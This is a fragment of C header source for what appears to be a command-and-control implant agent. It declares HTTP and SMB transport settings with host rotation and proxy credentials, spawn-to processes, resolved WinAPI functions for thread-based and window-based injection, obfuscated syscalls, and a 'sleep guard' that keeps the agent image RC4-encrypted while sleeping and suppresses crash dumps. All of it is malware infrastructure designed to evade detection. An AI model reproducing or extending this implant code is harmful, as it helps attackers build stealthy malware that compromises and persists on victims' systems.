...
typedef struct
{
    ...
    struct {
        ...
        struct {
            ...
            UINT32     NumHosts;
            LPWSTR     Method;
            SIZE_T     MethodLen;       /* byte length of Method allocation */
            SHORT      HostRotation;
            DWORD      HostIndex;
            DWORD      HostMaxRetries;
            DWORD      Secure;
            LPWSTR     UserAgent;
            SIZE_T     UserAgentLen;    /* byte length of UserAgent allocation */
            LPWSTR*    Uris;
            DWORD      NumUris;         /* number of URI entries */
            SIZE_T*    UriLens;         /* per-element byte lengths */
            LPWSTR*    Headers;
            DWORD      NumHeaders;      /* number of Header entries */
            SIZE_T*    HeaderLens;      /* per-element byte lengths */

            struct {
                BOOL   Enabled;
                LPWSTR Url;
                SIZE_T UrlLen;          /* byte length of Url allocation */
                LPWSTR Username;
                SIZE_T UsernameLen;     /* byte length of Username allocation */
                LPWSTR Password;
                SIZE_T PasswordLen;     /* byte length of Password allocation */
            } Proxy;
#endif

#ifdef TRANSPORT_SMB
            LPSTR   Name;
            SIZE_T  NameLen;            /* byte length of Name allocation */
            HANDLE  Handle;
#endif
        } Transport;
        ...
        {
            PWCHAR Spawn64;
            SIZE_T Spawn64Len;  /* byte length of Spawn64 allocation */
            PWCHAR Spawn86;
            SIZE_T Spawn86Len;  /* byte length of Spawn86 allocation */
        } Process;
    ...
    struct
    {
        ...
        WIN_FUNC( SwitchToThread )
        WIN_FUNC( CreateWaitableTimerA )
        WIN_FUNC( SetWaitableTimer )
        WIN_FUNC( WaitForSingleObject )
        WIN_FUNC( CreateEventA )
        WIN_FUNC( CloseHandle )
        WIN_FUNC( GetSystemInfo )
        
        // -Safe Thread Execution Functions
        WIN_FUNC( CreateTimerQueue )
        WIN_FUNC( CreateTimerQueueTimer )
        WIN_FUNC( DeleteTimerQueueTimer )
        WIN_FUNC( DeleteTimerQueue )
        WIN_FUNC( AddVectoredExceptionHandler )
        WIN_FUNC( RemoveVectoredExceptionHandler )
        WIN_FUNC( CreateThreadpoolWork )
        WIN_FUNC( SubmitThreadpoolWork )
        WIN_FUNC( WaitForThreadpoolWorkCallbacks )
        WIN_FUNC( CloseThreadpoolWork )
        WIN_FUNC( GetCurrentThreadId )
        WIN_FUNC( Sleep )
        ...
        // User32 APIs for InjectAdvanced functionality
        WIN_FUNC( GetWindowThreadProcessId )
        WIN_FUNC( IsWindowVisible )
        WIN_FUNC( EnumWindows )
        WIN_FUNC( PostMessageA )
        WIN_FUNC( SetTimer )
        WIN_FUNC( KillTimer )
...
#undef OBF_SYSCALL
    ...
    /* Sleep guard: non-encrypted VEH trampoline that survives RC4 image encryption.
     * During encrypted sleep: exceptions → clean NtTerminateProcess (no WER/crash dump).
     * During cleartext ops:   exceptions → real GlobalAgentVEH (full crash protection).
     * The stub + control block live in a separate allocation outside the agent image. */
    struct {
        PVOID           StubBase;         /* base of allocated 2-page region (code + control) */
        volatile DWORD* SleepingFlag;     /* pointer to sleeping flag in control block page */
        PVOID           VehHandle;        /* VEH registration handle for trampoline stub */
        PULONG_PTR      DispatcherReturn; /* pointer to timer dispatcher return addr in ctrl block */
        PVOID           SleepCallback;    /* address of external sleep callback stub (RX, outside image) */
        HANDLE          CachedWaitEvent;  /* persistent unsignaled event for WaitForSingleObjectEx timeout.
                                           * Created once at init. The stub uses this as WaitHandle when
                                           * no real handle (SMB pipe) is provided — WFSO returns
                                           * STATUS_TIMEOUT after the requested sleep duration.
                                           * Zero per-cycle kernel object creation. */
    } SleepGuard;
